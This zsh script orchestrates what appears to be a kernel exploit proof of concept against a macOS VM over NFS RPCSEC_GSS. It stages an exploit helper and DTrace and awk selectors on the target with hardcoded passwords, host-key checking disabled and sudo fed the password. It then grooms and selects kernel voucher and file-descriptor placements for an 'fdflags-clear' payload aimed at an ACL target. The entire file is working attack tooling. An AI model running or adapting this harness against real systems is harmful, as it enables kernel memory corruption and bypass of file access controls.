#!/bin/zsh

set -u
set -o pipefail

host=${1:-192.168.64.84}
workers=${2:-1}
count=${3:-512}
map_log=${4:-/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727/voucher_selective_latest.map}
acl_operation=${5:-access}
triples_per_worker=${6:-1}
result_host=${7:-}
result_port=${8:-0}
stage2_delay_us=${9:-0}
payload=${VOUCHER32_SETUP_PAYLOAD:-fdflags-clear}
acl_target=${VOUCHER32_SETUP_ACL_TARGET:-/Users/testtest/acl_oracle/target}
sequential=${VOUCHER32_SETUP_SEQUENTIAL:-0}
prefork_reclaim=${VOUCHER32_SETUP_PREFORK_RECLAIM:-0}
tight_acl_reclaim=${VOUCHER32_SETUP_TIGHT_ACL_RECLAIM:-0}
tight_drain_count=${VOUCHER32_SETUP_TIGHT_DRAIN_COUNT:-0}
tight_bounce_count=${VOUCHER32_SETUP_TIGHT_BOUNCE_COUNT:-0}
tight_sacrifice_count=${VOUCHER32_SETUP_TIGHT_SACRIFICE_COUNT:-2}
user=${RPC_GSS_VM_USER:-testtest}
password=test
root=/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727
lane=/Users/dawgyg/codex_lanes/nfs_rpcsecgss_poc
ssh_opts=(
	-o ConnectionAttempts=3
	-o ConnectTimeout=5
	-o ControlMaster=auto
	-o ControlPath=/tmp/codex-v32-select-%C
	-o ControlPersist=120
	-o IdentitiesOnly=yes
	-o KbdInteractiveAuthentication=yes
	-o NumberOfPasswordPrompts=1
	-o PasswordAuthentication=yes
	-o PubkeyAuthentication=yes
	-o PreferredAuthentications=publickey,keyboard-interactive,password
	-o StrictHostKeyChecking=no
	-o UserKnownHostsFile=/dev/null
)

if [[ "${acl_operation}" != access &&
    "${acl_operation}" != read &&
    "${acl_operation}" != write &&
    "${acl_operation}" != mkdir ]]; then
	print -u2 "invalid ACL operation: ${acl_operation}"
	exit 2
fi
if [[ "${payload}" != fdflags-clear ]]; then
	print -u2 "invalid voucher payload: ${payload}"
	exit 2
fi
if [[ "${sequential}" != 0 && "${sequential}" != 1 ]]; then
	print -u2 "invalid sequential mode: ${sequential}"
	exit 2
fi
if [[ "${prefork_reclaim}" != 0 && "${prefork_reclaim}" != 1 ]]; then
	print -u2 "invalid prefork reclaim mode: ${prefork_reclaim}"
	exit 2
fi
if [[ "${tight_acl_reclaim}" != 0 && "${tight_acl_reclaim}" != 1 ]]; then
	print -u2 "invalid tight ACL reclaim mode: ${tight_acl_reclaim}"
	exit 2
fi
if [[ ! "${tight_drain_count}" =~ '^[0-9]+$' ]] ||
    (( tight_drain_count > 256 )); then
	print -u2 "invalid tight drain count: ${tight_drain_count}"
	exit 2
fi
if [[ ! "${tight_bounce_count}" =~ '^[0-9]+$' ]] ||
    (( tight_bounce_count > 8 )); then
	print -u2 "invalid tight bounce count: ${tight_bounce_count}"
	exit 2
fi
initial_ready_pattern='^voucher_selective_prearmed '
if [[ "${prefork_reclaim}" == 1 ]]; then
	initial_ready_pattern='^voucher_selective_prefork_prearmed '
fi
designated_offset=400
designated_count=3
if [[ "${prefork_reclaim}" == 1 ]]; then
	designated_offset=0
	designated_count=${count}
fi
if [[ ! "${acl_target}" =~ '^/[A-Za-z0-9_./-]+$' ]]; then
	print -u2 "invalid ACL target: ${acl_target}"
	exit 2
fi
if [[ "${prefork_reclaim}" == 1 ]]; then
		if (( triples_per_worker < 1 || triples_per_worker > 32 )); then
		print -u2 "invalid prefork holes per worker: ${triples_per_worker}"
		exit 2
	fi
elif (( triples_per_worker != 1 )); then
	print -u2 "legacy fdflags setup requires exactly one triple per worker"
	exit 2
fi
if [[ -n "${result_host}" ]] &&
    [[ ! "${result_host}" =~ '^[0-9]+(\.[0-9]+){3}$' ]]; then
	print -u2 "invalid result host: ${result_host}"
	exit 2
fi
if (( result_port < 0 || result_port > 65535 )); then
	print -u2 "invalid result port: ${result_port}"
	exit 2
fi
if [[ ! "${stage2_delay_us}" =~ '^[0-9]+$' ]] ||
    (( stage2_delay_us > 1000000 )); then
	print -u2 "invalid helper stage-2 delay: ${stage2_delay_us}"
	exit 2
fi

connected=0
for attempt in $(seq 1 8); do
	if sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" true >/dev/null 2>&1; then
		connected=1
		break
	fi
	sleep 1
done
if (( connected == 0 )); then
	print -u2 "could not establish VM SSH control connection"
	exit 1
fi

sshpass -p "${password}" scp "${ssh_opts[@]}" \
	    "${lane}/voucher32_prearmed_oracle" \
	    "${root}/trace_voucher32_select_triple_beta4.d" \
	    "${root}/select_voucher32_fdflags_maps.awk" \
	    "${root}/select_voucher32_prefork_pairs.awk" \
	    "${root}/select_voucher32_prefork_fdflags_maps.awk" \
	    "${root}/select_voucher32_prefork_placements.awk" \
	    "${user}@${host}:/Users/testtest/" >/dev/null ||
    exit 1

sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "set -e
    setopt NULL_GLOB
    pkill -TERM -f '^/Users/testtest/v32select ' 2>/dev/null || true
    printf 'test\\n' | sudo -S pkill -TERM -f 'dtrace.*trace_voucher32_select_triple_beta4' 2>/dev/null || true
    sleep 0.2
    pkill -KILL -f '^/Users/testtest/v32select ' 2>/dev/null || true
    cp /Users/testtest/voucher32_prearmed_oracle /Users/testtest/v32select
    chmod +x /Users/testtest/v32select
	    rm -f /Users/testtest/v32_select.* /Users/testtest/v32_select_helper.*.log \
	        /Users/testtest/v32_select_pids /Users/testtest/v32_select_trace.out \
	        /Users/testtest/v32_select_trace.stderr \
	        /Users/testtest/v32_select_prefork_maps.fast \
	        /Users/testtest/v32_select_prefork_placements.fast
    printf 'test\\n' | sudo -S nohup /usr/sbin/dtrace -w \
        -o /Users/testtest/v32_select_trace.out \
        -s /Users/testtest/trace_voucher32_select_triple_beta4.d \
        >/Users/testtest/v32_select_trace.stderr 2>&1 &
    echo \$! >/Users/testtest/v32_select_dtrace_pid" ||
    exit 1

for attempt in $(seq 1 400); do
	if sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" \
	    "grep -q trace_begin /Users/testtest/v32_select_trace.out" \
	    >/dev/null 2>&1; then
		break
	fi
	sleep 0.025
done
if (( attempt == 400 )); then
	print -u2 "selection DTrace did not start"
	exit 1
fi

sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "set -e
    sequential=${sequential}
    for worker in \$(seq 0 $((workers - 1))); do
        base=\$((30000 + worker * ${count}))
		        env VOUCHER32_PAYLOAD=${payload} \
		            VOUCHER32_FDFLAGS_TARGET=1 \
		            VOUCHER32_FDFLAGS_PREFORK_RECLAIM=${prefork_reclaim} \
		            VOUCHER32_FDFLAGS_C_INDEX=\$((base + ${designated_offset})) \
		            VOUCHER32_FDFLAGS_C_COUNT=${designated_count} \
	            VOUCHER32_ACL_TARGET=${acl_target} \
	            VOUCHER32_ACL_OPERATION=${acl_operation} \
	            VOUCHER32_TIGHT_ACL_RECLAIM=${tight_acl_reclaim} \
	            VOUCHER32_TIGHT_DRAIN_COUNT=${tight_drain_count} \
	            VOUCHER32_TIGHT_BOUNCE_COUNT=${tight_bounce_count} \
	            VOUCHER32_TIGHT_SACRIFICE_COUNT=${tight_sacrifice_count} \
	            VOUCHER32_THREADED_STAGE2=1 \
	            VOUCHER32_STAGE2_DELAY_US=${stage2_delay_us} \
	            VOUCHER32_RESULT_HOST=${result_host} \
	            VOUCHER32_RESULT_PORT=${result_port} \
	            VOUCHER32_SELECT_PREFIX=/Users/testtest/v32_select \
            /Users/testtest/v32select ${count} selective \${base} \
            >/Users/testtest/v32_select_helper.\${worker}.log 2>&1 &
        helper_pid=\$!
        echo \${helper_pid} >>/Users/testtest/v32_select_pids
        if (( sequential == 1 )); then
            for attempt in \$(seq 1 800); do
                if grep -q '${initial_ready_pattern}' \
                    /Users/testtest/v32_select_helper.\${worker}.log; then
                    break
                fi
                kill -0 \${helper_pid}
                sleep 0.025
            done
            grep -q '${initial_ready_pattern}' \
                /Users/testtest/v32_select_helper.\${worker}.log
            children=\$(pgrep -P \${helper_pid} 2>/dev/null || true)
            if test -n \"\${children}\"; then
                kill -STOP \${=children}
            fi
            kill -STOP \${helper_pid}
        fi
    done" ||
    exit 1

for attempt in $(seq 1 800); do
	ready=$(sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" \
	    "grep -l '${initial_ready_pattern}' \
	        /Users/testtest/v32_select_helper.*.log 2>/dev/null |
	        wc -l | tr -d ' '" 2>/dev/null)
	if [[ ${ready:-0} -eq ${workers} ]]; then
		break
	fi
	sleep 0.025
done
if [[ ${ready:-0} -ne ${workers} ]]; then
	print -u2 "selective helpers did not prearm: ${ready:-0}/${workers}"
	exit 1
fi

if [[ "${prefork_reclaim}" == 1 ]]; then
	prefork_output=$(
	sshpass -p "${password}" ssh "${ssh_opts[@]}" \
		    "${user}@${host}" \
		    "PREFORK_SELECTION_LIMIT=${triples_per_worker} /bin/zsh -s" \
		    <<'REMOTE'
	set -e
	sleep 0.2
	awk -v limit="${PREFORK_SELECTION_LIMIT}" \
	    -f /Users/testtest/select_voucher32_prefork_pairs.awk \
	    /Users/testtest/v32_select_trace.out \
	    >/Users/testtest/v32_select_prefork_maps.fast
test -s /Users/testtest/v32_select_prefork_maps.fast
cp /Users/testtest/v32_select_pids \
    /Users/testtest/v32_select_pids.prefork_all
: >/Users/testtest/v32_select_pids.prefork_mapped
: >/Users/testtest/v32_select_pids.prefork_unmapped
	while read -r pid; do
	    gate="/Users/testtest/v32_select.${pid}"
	    awk -v wanted="${pid}" \
	        '$1 == wanted { print $2, $3, $4, $5, $6 }' \
	        /Users/testtest/v32_select_prefork_maps.fast >"${gate}"
	    if ! test -s "${gate}"; then
	        printf "%s\n" "${pid}" \
	            >>/Users/testtest/v32_select_pids.prefork_unmapped
	        kill -STOP "${pid}" 2>/dev/null || true
	        continue
	    fi
	    printf "%s\n" "${pid}" \
	        >>/Users/testtest/v32_select_pids.prefork_mapped
    kill -CONT "${pid}"
    kill -USR1 "${pid}"
done </Users/testtest/v32_select_pids.prefork_all
	mv /Users/testtest/v32_select_pids.prefork_mapped \
	    /Users/testtest/v32_select_pids
	expected=$(wc -l </Users/testtest/v32_select_pids | tr -d ' ')
	for attempt in $(seq 1 1600); do
	    spawned=$(grep -l '^voucher_fdflags_spawned_wait ' \
	        /Users/testtest/v32_select_helper.*.log 2>/dev/null |
	        wc -l | tr -d ' ')
	    if test "${spawned}" -eq "${expected}"; then
	        break
	    fi
	    sleep 0.025
	done
	if test "${spawned:-0}" -ne "${expected}"; then
	    printf "prefork fdflags fork timeout: %s/%s\n" \
	        "${spawned:-0}" "${expected}" >&2
	    exit 1
	fi
	for attempt in $(seq 1 800); do
	    fork_flags=$(grep -c ' FD_FORK_FLAGS ' \
	        /Users/testtest/v32_select_trace.out 2>/dev/null || true)
	    if test "${fork_flags:-0}" -ge "${expected}"; then
	        break
	    fi
	    sleep 0.025
	done
	if test "${fork_flags:-0}" -lt "${expected}"; then
	    printf "prefork flags trace timeout: %s/%s\n" \
	        "${fork_flags:-0}" "${expected}" >&2
	    exit 1
	fi
	awk -f /Users/testtest/select_voucher32_prefork_placements.awk \
	    /Users/testtest/v32_select_prefork_maps.fast \
	    /Users/testtest/v32_select_trace.out \
	    >/Users/testtest/v32_select_prefork_placements.fast
	cp /Users/testtest/v32_select_pids \
	    /Users/testtest/v32_select_pids.placement_all
	: >/Users/testtest/v32_select_pids.placement_mapped
	: >/Users/testtest/v32_select_pids.placement_unmapped
	while read -r pid; do
	    map=$(awk -v wanted="${pid}" \
	        '$1 == wanted { print; exit }' \
	        /Users/testtest/v32_select_prefork_placements.fast)
	    if test -z "${map}"; then
	        printf "%s\n" "${pid}" \
	            >>/Users/testtest/v32_select_pids.placement_unmapped
	        children=$(pgrep -P "${pid}" 2>/dev/null || true)
	        if test -n "${children}"; then
	            kill -STOP ${=children} 2>/dev/null || true
	        fi
	        kill -STOP "${pid}" 2>/dev/null || true
	        continue
	    fi
	    fields=(${=map})
	    fdslot=${fields[11]}
	    fdslot_file="/Users/testtest/v32_select.${pid}.fdslot"
	    fdslot_tmp="${fdslot_file}.tmp.$$"
	    printf "%s\n" "${fdslot}" >"${fdslot_tmp}"
	    mv "${fdslot_tmp}" "${fdslot_file}"
	    printf "%s\n" "${pid}" \
	        >>/Users/testtest/v32_select_pids.placement_mapped
	done </Users/testtest/v32_select_pids.placement_all
	mv /Users/testtest/v32_select_pids.placement_mapped \
	    /Users/testtest/v32_select_pids
	expected=$(wc -l </Users/testtest/v32_select_pids | tr -d ' ')
	test "${expected}" -gt 0
	for attempt in $(seq 1 1600); do
	    ready=$(grep -l '^voucher_selective_prearmed ' \
	        /Users/testtest/v32_select_helper.*.log 2>/dev/null |
	        wc -l | tr -d ' ')
	    if test "${ready}" -eq "${expected}"; then
	        break
	    fi
	    sleep 0.025
	done
	if test "${ready:-0}" -ne "${expected}"; then
	    printf "prefork fdflags slot timeout: %s/%s\n" \
	        "${ready:-0}" "${expected}" >&2
	    exit 1
	fi
	printf "prefork_candidates=%s\n" \
	    "$(wc -l </Users/testtest/v32_select_pids.prefork_all | tr -d ' ')"
	printf "prefork_placements=%s\n" "${expected}"
	printf "prefork_unmapped=%s\n" \
	    "$(wc -l </Users/testtest/v32_select_pids.prefork_unmapped |
	    tr -d ' ')"
	printf "prefork_placement_unmapped=%s\n" \
	    "$(wc -l </Users/testtest/v32_select_pids.placement_unmapped |
	    tr -d ' ')"
REMOTE
	)
	prefork_status=$?
	print -r -- "${prefork_output}"
	if (( prefork_status != 0 )); then
		print -u2 "prefork fdflags placement failed"
		exit 1
	fi
fi

selection_output=$(
sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" '
    set -e
    printf "test\n" | sudo -S pkill -TERM -f \
        "dtrace.*trace_voucher32_select_triple_beta4" 2>/dev/null || true
	    sleep 0.2
	    if test -s /Users/testtest/v32_select_prefork_placements.fast; then
	        awk "{ print \$1, \$2, \$3, \$4, \$5,
	            \$6, \$7, \$8, \$9, \$10 }" \
	            /Users/testtest/v32_select_prefork_placements.fast \
	            >/Users/testtest/v32_select_maps.fast
    else
        awk -f /Users/testtest/select_voucher32_fdflags_maps.awk \
            /Users/testtest/v32_select_trace.out \
            >/Users/testtest/v32_select_maps.fast
    fi
	    cp /Users/testtest/v32_select_pids \
	        /Users/testtest/v32_select_pids.all
	    : >/Users/testtest/v32_select_pids.mapped
	    : >/Users/testtest/v32_select_pids.unmapped
	    while read -r pid; do
	        map=$(awk -v wanted="${pid}" \
	            '"'"'$1 == wanted { print; exit }'"'"' \
	            /Users/testtest/v32_select_maps.fast)
	        if test -z "${map}"; then
	            printf "%s\n" "${pid}" \
	                >>/Users/testtest/v32_select_pids.unmapped
	            continue
	        fi
        fields=(${=map})
        a=${fields[2]}
        b=${fields[3]}
        c=${fields[4]}
        e=${fields[5]}
        a_ptr=${fields[6]}
        b_ptr=${fields[7]}
        c_ptr=${fields[8]}
        e_ptr=${fields[9]}
        flags=${fields[10]}
        printf "%s %s %s %s\n" "${a}" "${b}" "${c}" "${e}" \
            >"/Users/testtest/v32_select.${pid}"
        printf "%s\n" "${pid}" >>/Users/testtest/v32_select_pids.mapped
        printf "selected VOUCHER_TRIPLE pid=%s a_idx=%s b_idx=%s c_idx=%s a_ptr=%s b_ptr=%s c_ptr=%s case=fast_map\n" \
            "${pid}" "${a}" "${b}" "${c}" \
            "${a_ptr}" "${b_ptr}" "${c_ptr}"
        printf "selected FD_TARGET parent_pid=%s e_idx=%s e_ptr=%s flags=%s\n" \
            "${pid}" "${e}" "${e_ptr}" "${flags}"
	    done </Users/testtest/v32_select_pids.all
	    mv /Users/testtest/v32_select_pids.mapped \
	        /Users/testtest/v32_select_pids
	    ps -A -o pid=,ppid= >/Users/testtest/v32_select_processes
	    awk '"'"'
	        NR == FNR { unmapped[$1] = 1; next }
	        (($1 in unmapped) || ($2 in unmapped)) { print $1 }
	    '"'"' /Users/testtest/v32_select_pids.unmapped \
	        /Users/testtest/v32_select_processes |
	        xargs -n 100 kill -STOP 2>/dev/null || true
	    awk '"'"'
	        NR == FNR { mapped[$1] = 1; next }
	        (($1 in mapped) || ($2 in mapped)) { print $1 }
	    '"'"' /Users/testtest/v32_select_pids \
	        /Users/testtest/v32_select_processes |
	        xargs -n 100 kill -CONT 2>/dev/null || true
	    test -s /Users/testtest/v32_select_pids
    for pid in $(cat /Users/testtest/v32_select_pids); do
        test -s "/Users/testtest/v32_select.${pid}"
        kill -0 "${pid}"
    done
    printf "helpers_prearmed=%s\n" \
        "$(wc -l </Users/testtest/v32_select_pids | tr -d " ")"
	    printf "helper_pids=%s\n" \
	        "$(tr "\n" " " </Users/testtest/v32_select_pids)"
	    printf "parked_unmapped_helpers=%s\n" \
	        "$(wc -l </Users/testtest/v32_select_pids.unmapped | tr -d " ")"
	    printf "ready_before_release=%s\n" \
        "$(grep -l "^voucher_selective_ready " \
            /Users/testtest/v32_select_helper.*.log 2>/dev/null |
            wc -l | tr -d " ")"
'
)
selection_status=$?
print -r -- "${selection_output}" | tee "${map_log}"
if (( selection_status != 0 )); then
	print -u2 "selective mapping incomplete; cleaning the partial cohort"
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" '
	    if [[ -f /Users/testtest/v32_select_pids ]]; then
	        while read -r pid; do
	            kill -TERM "${pid}" 2>/dev/null || true
	        done </Users/testtest/v32_select_pids
	    fi
	    printf "test\n" | sudo -S pkill -TERM -f \
	        "dtrace.*trace_voucher32_select_triple_beta4" 2>/dev/null || true
	    sleep 0.2
	    pkill -KILL -f "^/Users/testtest/v32select " 2>/dev/null || true
	    rm -f /Users/testtest/v32_select_pids \
	        /Users/testtest/v32_select.[0-9]*
	' >/dev/null 2>&1 || true
	exit 1
fi

if (( triples_per_worker > 1 && prefork_reclaim == 0 )); then
	dense_map=$(sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" \
	    "TRIPLES_PER_WORKER=${triples_per_worker} /bin/zsh -s" <<'REMOTE'
set -e
for pid in $(cat /Users/testtest/v32_select_pids); do
	gate="/Users/testtest/v32_select.${pid}"
	: >"${gate}"
	awk -v wanted="${pid}" -v limit="${TRIPLES_PER_WORKER}" \
	    -v gate="${gate}" '
	    $0 ~ ("VOUCHER_TRIPLE pid=" wanted " ") && selected < limit {
	        a = b = c = ""
	        for (field = 1; field <= NF; field++) {
	            split($field, pair, "=")
	            if (pair[1] == "a_idx") a = pair[2]
	            if (pair[1] == "b_idx") b = pair[2]
	            if (pair[1] == "c_idx") c = pair[2]
	        }
	        if (a == "" || b == "" || c == "" ||
	            used[a] || used[b] || used[c]) next
	        print a, b, c >> gate
	        used[a] = used[b] = used[c] = 1
	        print "dense_selected " $0
	        selected++
		    }
		    END {
		        if (selected == 0) {
		            printf "pid %d had no disjoint triples\n",
		                wanted > "/dev/stderr"
		            exit 1
		        }
		        printf "dense_worker pid=%d selected=%d limit=%d\n",
		            wanted, selected, limit
		    }
		' /Users/testtest/v32_select_trace.out
done
total_candidate_as=0
for pid in $(cat /Users/testtest/v32_select_pids); do
	total_candidate_as=$((total_candidate_as +
	    $(wc -l <"/Users/testtest/v32_select.${pid}")))
done
printf "dense_helpers=%s triples_per_worker=%s total_candidate_as=%s\n" \
    "$(wc -l </Users/testtest/v32_select_pids | tr -d " ")" \
    "${TRIPLES_PER_WORKER}" \
    "${total_candidate_as}"
REMOTE
	) || exit 1
	print -r -- "${dense_map}" | tee -a "${map_log}"
fi

print "map_log=${map_log}"
print "acl_operation=${acl_operation}"
print "payload=${payload}"
print "acl_target=${acl_target}"
print "triples_per_worker=${triples_per_worker}"
print "result_endpoint=${result_host:-disabled}:${result_port}"
print "helper_stage2_delay_us=${stage2_delay_us}"
print "sequential=${sequential}"
print "prefork_reclaim=${prefork_reclaim}"
